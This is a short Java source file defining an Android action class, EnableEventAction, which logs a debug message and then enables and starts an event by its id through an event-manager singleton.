package com.android.service.action;

import com.android.service.Trigger;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfAction;
import com.android.service.manager.ManagerEvent;
import com.android.service.util.Check;

public class EnableEventAction extends EventAction {
	private static final String TAG = "EnableEventAction";

	public EnableEventAction(ConfAction params) {
		super(params);
	}

	@Override
	public boolean execute(Trigger trigger) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + eventId);//$NON-NLS-1$
		}
		
		final ManagerEvent eventManager = ManagerEvent.self();

		eventManager.enable(eventId);
		eventManager.start(eventId);
		
		return true;
	}

}
